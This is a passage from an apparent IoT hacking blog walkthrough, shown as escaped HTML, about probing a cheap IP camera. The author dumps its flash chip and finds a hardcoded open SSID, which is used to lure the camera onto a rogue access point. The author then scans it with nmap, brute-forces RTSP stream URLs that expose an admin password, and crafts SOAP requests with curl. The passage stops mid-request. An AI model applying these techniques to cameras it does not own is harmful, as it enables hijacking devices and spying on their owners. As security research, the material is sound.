&lt;/span&gt;Chip status register: Block Protect 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BP1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is not &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Chip status register: Block Protect 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BP0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is not &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Chip status register: Write Enable Latch &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WEL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is not &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Chip status register: Write In Progress &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WIP/BUSY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is not &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;This chip may contain one-time programmable memory. flashrom cannot &lt;span class=&quot;nb&quot;&gt;read
&lt;/span&gt;and may never be able to write it, hence it may not be able to completely
clone the contents of this chip &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;see man page &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Reading flash...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This process took very long and wasn’t really promising but after nearly an hour it finished and I was able to examine a firmware binary:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ~/tools/&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings MX25L128.bin | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; gcc 
arm-unknown-linux-uclibcgnueabi-gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Buildroot 2012.02&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 4.4.0 20100318 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;experimental&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
GcC&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;
jGcc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I guess, due to low maximum sample rates of the BusPirate it will dump really slow.
Link for the extracted binary: https://github.com/herrfeder/Offensive_IOT_Exploitation/blob/master/gist_files/ip_cam_firmware.bin&lt;/p&gt;

&lt;p&gt;Some other interesting links for this purpose:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;img src=&quot;http://freneticrapport.blogspot.de/2010/10/how-to-restore-bios-after-bad-flash.html&quot; alt=&quot;How to restore BIOS after bad flash&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;img src=&quot;http://hackaday.com/2009/06/30/parts-spi-eeprom-25aa25lc/&quot; alt=&quot;SPI interfacing experiments&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;img src=&quot;https://medium.com/@rxseger/spi-interfacing-experiments-eeproms-bus-pirate-adc-opt101-with-raspberry-pi-9c819511efea&quot; alt=&quot;Other SPI interfacing experiments&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3-acess-over-wireless-interfaces-and-network&quot;&gt;3. Acess over Wireless Interfaces and Network&lt;/h2&gt;

&lt;h4 id=&quot;31-internal-communication&quot;&gt;3.1 Internal Communication&lt;/h4&gt;

&lt;p&gt;The UI experience of the App for communicating with the Cam is really bad and I wasn’t patient enough, to set up WiFi connectivity with the App.
On first glance I suspected it would setup an open access point and I can simply connect to it but it doesn’t. There is some functionality to connect to another existent WiFi by capturing with the provided Smartphone App generated QR-Code. I took another way and examined the OS of the Cam to find out what it is up to:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/network &lt;span class=&quot;c&quot;&gt;# cat interfaces &lt;/span&gt;
auto lo

iface lo inet loopback

iface eth0 inet static
	address	172.19.78.3
	broadcast 172.31.255.255
	netmask 255.240.0.0
	gateway 172.19.78.2
	pre-up	/sbin/insmod /lib/modules/2.6.14/extra/ftmac100.ko
	post-down /sbin/rmmod ftmac100.ko

&lt;span class=&quot;c&quot;&gt;# no hints in the configuration on the interfaces&lt;/span&gt;

/etc &lt;span class=&quot;c&quot;&gt;# cat wpa_supplicant0.conf &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ctrl_interface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/Wireless  
 &lt;span class=&quot;nv&quot;&gt;network&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt; 
     &lt;span class=&quot;nv&quot;&gt;ssid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Free-AP0&quot;&lt;/span&gt;   
     &lt;span class=&quot;nv&quot;&gt;key_mgmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NONE  
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# but a wpa_supplicant conf with a given SSID  &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As I set up an open AP with the SSID “Free-AP0” the Cam connects immediately to it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH  1 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 6 s &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2017-08-17 18:16 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; paused output                                        
                                                                                                       
 BSSID              PWR RXQ  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                                        
 00:C0:CA:62:41:8F   &lt;span class=&quot;nt&quot;&gt;-9&lt;/span&gt; 100       90       13    0   1  54   OPN              Free-AP0                  
                                                                                                        
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                              
                                                                                                        
 00:C0:CA:62:41:8F  F8:0C:F3:FF:5F:6C   14   54 - 6      0       11       &lt;span class=&quot;c&quot;&gt;# Smartphone with App                               &lt;/span&gt;
 00:C0:CA:62:41:8F  20:F4:1B:5C:07:AD  &lt;span class=&quot;nt&quot;&gt;-19&lt;/span&gt;    1 - 1      0        5       &lt;span class=&quot;c&quot;&gt;# IPCam                               &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To set up open or WEP/WPA access points with internet access quickly, I recommend the little bashtool qw (https://github.com/file-not-found/qw) of a collegue of mine.
Prequesities are hostapd and dnsmasque. Of course, you can do it with hostapd by bridging or routing the connectivity manually.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~/wlan &lt;span class=&quot;c&quot;&gt;# ./qw ap Free-AP0 wlan0       &lt;/span&gt;
Enter passphrase &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;leave blank &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;open network&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 
Configuration file: /tmp/qw_1_hostapd.conf
Using interface wlan0 with hwaddr 00:c0:ca:62:41:8f and ssid &lt;span class=&quot;s2&quot;&gt;&quot;Free-AP0&quot;&lt;/span&gt;
wlan0: interface state UNINITIALIZED-&amp;gt;ENABLED
wlan0: AP-ENABLED 
wlan0: STA f8:0c:f3:ff:5f:6c IEEE 802.11: authenticated		&lt;span class=&quot;c&quot;&gt;# smartphone tries to connect&lt;/span&gt;
wlan0: STA f8:0c:f3:ff:5f:6c IEEE 802.11: associated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aid 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
wlan0: AP-STA-CONNECTED f8:0c:f3:ff:5f:6c
wlan0: STA f8:0c:f3:ff:5f:6c RADIUS: starting accounting session C7E9972B18913018
Unsupported authentication algorithm &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
handle_auth_cb: STA 20:f4:1b:5c:07:ad not found
Unsupported authentication algorithm &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
handle_auth_cb: STA 20:f4:1b:5c:07:ad not found
wlan0: STA 20:f4:1b:5c:07:ad IEEE 802.11: authenticated		&lt;span class=&quot;c&quot;&gt;# IPCam tries to connect&lt;/span&gt;
wlan0: STA 20:f4:1b:5c:07:ad IEEE 802.11: associated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aid 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
wlan0: AP-STA-CONNECTED 20:f4:1b:5c:07:ad
wlan0: STA 20:f4:1b:5c:07:ad RADIUS: starting accounting session 611E6C4DC8EFDE0C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As the IPCam has network connection we will take the first step of network recon and scan the IPCam itself:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nmap 10.0.0.21&lt;/span&gt;

Starting Nmap 7.50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-15 15:10 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.21
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.022s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE SERVICE
554/tcp  open  rtsp	&lt;span class=&quot;c&quot;&gt;# streaming video data locally&lt;/span&gt;
5000/tcp open  upnp	&lt;span class=&quot;c&quot;&gt;# connect to distanced web server, will probably open port on router&lt;/span&gt;
MAC Address: 20:F4:1B:5C:07:AD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Shenzhen Bilian electronic&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As it has an open upnp port I suspected it to open a port on a router, when it is allowed to. I checked this out on a FritzBox but it doesn’t open a port automatically.&lt;/p&gt;

&lt;p&gt;There is a telnet daemon on the device. It seems to work:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nmap 10.0.0.21

Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-15 15:23 CEST
Nmap scan report for 10.0.0.21
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
23/tcp   open  telnet
554/tcp  open  rtsp
5000/tcp open  upnp
MAC Address: 20:F4:1B:5C:07:AD (Shenzhen Bilian electronic)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;32-trying-interactingaccessing-the-provided-services&quot;&gt;3.2 Trying Interacting/Accessing the provided services&lt;/h4&gt;
&lt;p&gt;To get a more detailed view of provided services we will use nmap again to fingerprint the previous found ports and services:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nmap --script rtsp-url-brute -p 554 10.0.1.25                                                                                                               :(&lt;/span&gt;

PORT    STATE SERVICE
554/tcp open  rtsp
| rtsp-url-brute: 
|   discovered: 
...

|     rtsp://10.0.1.25/cam4/mpeg4
|     rtsp://10.0.1.25/Video?Codec&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MPEG4&amp;amp;Width&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;720&amp;amp;Height&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;576&amp;amp;Fps&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30
|     rtsp://10.0.1.25/cam1/onvif-h264
...
|     rtsp://10.0.1.25/cgi-bin/viewer/video.jpg?resolution&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;640x480
|     rtsp://10.0.1.25/h264Preview_01_sub
|     rtsp://10.0.1.25/h264_vga.sdp
...
|     rtsp://10.0.1.25/nphMpeg4/g726-640x480
|     rtsp://10.0.1.25/nphMpeg4/nil-320x240
|     rtsp://10.0.1.25/onvif-media/media.amp
|     rtsp://10.0.1.25/mpeg4unicast
|     rtsp://10.0.1.25/onvif/live/2
|     rtsp://10.0.1.25/onvif1
|     rtsp://10.0.1.25/onvif2
...
|     rtsp://10.0.1.25/vis
|     rtsp://10.0.1.25/video1+audio1
|     rtsp://10.0.1.25/wfov
|_    rtsp://10.0.1.25/user&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;admin_password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tlJwpbo6_channel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1_stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.sdp?real_stream



&lt;span class=&quot;c&quot;&gt;# nmap --script rtsp-methods -p 554 10.0.1.25&lt;/span&gt;

PORT    STATE SERVICE
554/tcp open  rtsp
|_rtsp-methods: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, GET_PARAMETER, SET_PARAMETER,USER_CMD_SET

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Many of these detected URL’s doesn’t work. rtsp://10.0.1.25/onvif1 will give definitely a stream.&lt;/p&gt;

&lt;p&gt;This seems very interesting but doing research for it doesn’t bring up as many attack vectors and info material as UPNP does. The services presented on this port suffers often evil vulnerabilties. It’s more critical that UPNP devices often forces the gateway to open ports independently to connect to backend or remote servers of the manufacturers or other third parties. Many DDos attacks in the past with IOT involved used open UPNP ports to control them.
Footprinting this UPNP port reveals it’s presented service and version:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nmap -sV -p 5000 10.0.1.25&lt;/span&gt;

PORT     STATE SERVICE VERSION
5000/tcp open  soap    gSOAP 2.8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So my first action was to speak with popular UPNP hacker tools to the interface but didn’t respond:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# miranda -i wlan0 -v&lt;/span&gt;

Binding to interface wlan0 ...

Verbose mode enabled!
upnp&amp;gt; msearch

Entering discovery mode &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'upnp:rootdevice'&lt;/span&gt;, Ctl+C to stop...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Metasploit, the famous exploiting framework includes some UPNP attack vectors for exploits especially for routers. To act as a real noob I will fire up some of these scripts to hope for any reaction without any knowledge of the underlying service “gSoap”. Obviously this didn’t result in any success. Metasploit includes another UPNP ssdp scanner but it won’t triggers anythin neither.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/upnp/ssdp_msearch
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ssdp_msearch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 10.0.1.25/32
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ssdp_msearch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending UPnP SSDP probes to 10.0.1.25-&amp;gt;10.0.1.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; No SSDP endpoints found.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Scanned 1 of 1 hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100% &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As it won’t broadcasting anything to it’s environment it has to be an API I have to trigger somehow.
So I tried to access the port it via Webbrowser at first. It shows a SOAP XML-API that doesn’t want’s to be served with GET requests:&lt;/p&gt;
&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;SOAP-ENV:Fault&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:SOAP-ENV=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2003/05/soap-envelope&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:SOAP-ENC=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2003/05/soap-encoding&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsd=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:wsa=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.xmlsoap.org/ws/2004/08/addressing&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:wsdd=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.xmlsoap.org/ws/2005/04/discovery&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:chan=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.microsoft.com/ws/2005/02/duplex&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:wsa5=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2005/08/addressing&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xmime=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://tempuri.org/xmime.xsd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xop=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2004/08/xop/include&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:tt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.onvif.org/ver10/schema&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:wsrfbf=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://docs.oasis-open.org/wsrf/bf-2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:wstop=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://docs.oasis-open.org/wsn/t-1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:wsrfr=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://docs.oasis-open.org/wsrf/r-2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:tdn=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.onvif.org/ver10/network/wsdl&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:tds=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.onvif.org/ver10/device/wsdl&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:tev=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.onvif.org/ver10/events/wsdl&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:wsnt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://docs.oasis-open.org/wsn/b-2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:tptz=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.onvif.org/ver20/ptz/wsdl&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:trt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.onvif.org/ver10/media/wsdl&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;faultcode&amp;gt;&lt;/span&gt;SOAP-ENV:Client&lt;span class=&quot;nt&quot;&gt;&amp;lt;/faultcode&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;faultstring&amp;gt;&lt;/span&gt;HTTP GET method not implemented&lt;span class=&quot;nt&quot;&gt;&amp;lt;/faultstring&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SOAP-ENV:Fault&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now I need to get to know how to communicate with this api. This link can help:
http://forums.opto22.com/t/how-to-send-soap-messages/951/9
I need to send POST requests with a XML string in SOAP format.
In addition I was searching for “soap” string in the filesystem, it will reveal that the binary npc holds the gSoap service and used headers and SOAP elements:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# strings npc | grep -i soap &lt;/span&gt;
SOAP-ENV
http://www.w3.org/2003/05/soap-envelope
http://schemas.xmlsoap.org/soap/envelope/
SOAP-ENC
...
gSOAP Web Service
gSOAP/2.8
wsa5:SoapAction
SOAP-ENC:id
SOAP-ENC:position
...
xmlns:SOAP-RPC
SOAP-ENC:ref
application/xop+xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application/soap+xml&quot;&lt;/span&gt;
SOAPAction
SOAP-ENC:Array
...
no master socket &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;soap_accept&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
accept failed &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;soap_accept&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
setsockopt SO_RCVBUF failed &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;soap_accept&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
setsockopt TCP_NODELAY failed &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;soap_accept&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
SOAP-ENC:root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There are interesting strings like “xmlns:SOAP-RPC” and “wsa5:SoapAction” which leads to implemented methods, I guess.
As I know I have to send POST requests with attached XML content I can easily craft such a request with curl:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: text/xml; charset=utf-8&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SOAPAction:&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; @soap_req_01.txt &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST http://10.0.1.25:5000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;With the example soap request:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat soap_req_01.txt &lt;/span&gt;

&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;standalone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no&quot;&lt;/span&gt; ?&amp;gt;
  &amp;lt;SOAP-ENV:Envelope
   SOAP-ENV:encodingStyle&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&lt;/span&gt;
   xmlns:SOAP-ENV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&lt;/span&gt;
   xmlns:SOAP-ENC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&lt;/span&gt;
   xmlns:xsi&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/1999/XMLSchema-instance&quot;&lt;/span&gt;
   xmlns:xsd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/1999/XMLSchema&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
	&amp;lt;SOAP-ENV:Body&amp;gt;
		&amp;lt;ns1:doubleAnInteger
		 xmlns:ns1&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;urn:MySoapServices&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
			&amp;lt;param1 xsi:type&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xsd:int&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;123&amp;lt;/param1&amp;gt;
		&amp;lt;/ns1:doubleAnInteger&amp;gt;
